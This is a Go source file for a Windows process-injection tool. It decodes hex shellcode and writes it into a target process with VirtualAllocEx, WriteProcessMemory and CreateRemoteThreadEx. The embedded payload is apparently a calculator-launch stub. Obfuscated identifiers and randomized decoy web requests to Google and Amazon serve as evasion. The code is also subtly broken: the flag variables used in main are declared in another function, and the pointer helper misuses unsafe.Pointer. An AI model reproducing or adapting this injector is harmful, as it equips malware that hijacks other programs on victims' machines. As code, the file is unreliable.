package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func a3d1a0f4d6e7f8() {
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < 3; i++ {
		go func() {
			time.Sleep(5 * time.Minute)
			urls := []string{
				"https://www.example.com",
				"https://www.google.com",
				"https://www.amazon.com",
			}
			rand.Shuffle(len(urls), func(i, j int) {
				urls[i], urls[j] = urls[j], urls[i]
			})
			for _, url := range urls[:rand.Intn(3)+1] {
				http.Get(url)
			}
		}()
	}
}

func b9c0d1e2f3() {
	var d2e3f4g5h6 bool
	var i4j5k6l7m8 bool
	var n1o2p3q4r5 int
	flag.BoolVar(&d2e3f4g5h6, "verbose", false, "Enable verbose output")
	flag.BoolVar(&i4j5k6l7m8, "debug", false, "Enable debug output")
	flag.IntVar(&n1o2p3q4r5, "pid", 0, "Process ID to inject shellcode into")
	flag.Parse()
}

func e0f1g2h3i4j5() (string, error) {
	shellcode, err := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if err != nil {
		return "", fmt.Errorf("[!]there was an error decoding the string to a hex byte array: %w", err)
	}
	return string(shellcode), nil
}

func e6f7g8h9i0j1() *windows.LazySystemDLL {
	return windows.NewLazySystemDLL("kernel32.dll")
}

func e9fa01b2c3(flagVar interface{}) uintptr {
	return uintptr(unsafe.Pointer(flagVar))
}

func main() {
	a3d1a0f4d6e7f8()
	b9c0d1e2f3()
	shellcode, err := e0f1g2h3i4j5()
	if err != nil {
		log.Fatal(err)
	}
	kernel32 := e6f7g8h9i0j1()
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(n1o2p3q4r5))
	if errOpenProcess != nil {
		log.Fatal(fmt.Errorf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess))
	}
	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
		fmt.Printf("[-]Successfully got a handle to process %d\n", n1o2p3q4r5)
	}
	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
		fmt.Printf("[DEBUG]Calling VirtualAllocEx on PID %d...\n", n1o2p3q4r5)
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Errorf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc))
	}
	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
		fmt.Printf("[-]Successfully allocated memory in PID %d\n", n1o2p3q4r5)
	}
	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
		fmt.Printf("[DEBUG]Calling WriteProcessMemory on PID %d...\n", n1o2p3q4r5)
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Errorf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory))
	}
	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
		fmt.Printf("[-]Successfully wrote shellcode to PID %d\n", n1o2p3q4r5)
	}
	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
		fmt.Printf("[DEBUG]Calling VirtualProtectEx on PID %d...\n", n1o2p3q4r5)
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Errorf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx))
	}
	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
		fmt.Printf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d\n", n1o2p3q4r5)
	}
	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
		fmt.Printf("[DEBUG]Call CreateRemoteThreadEx on PID %d...\n", n1o2p3q4r5)
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Errorf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx))
	}
	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
		fmt.Printf("[+]Successfully create a remote thread in PID %d\n", n1o2p3q4r5)
	}
	if e9fa01b2c3(&i4j5k6l7m8)*0x1 != 0 {
		fmt.Printf("[DEBUG]Calling CloseHandle on PID %d...\n", n1o2p3q4r5)
	}
	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		log.Fatal(fmt.Errorf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle))
	}
	if e9fa01b2c3(&d2e3f4g5h6)*0x1 != 0 {
		fmt.Printf("[-]Successfully closed the handle to PID %d\n", n1o2p3q4r5)
	}
}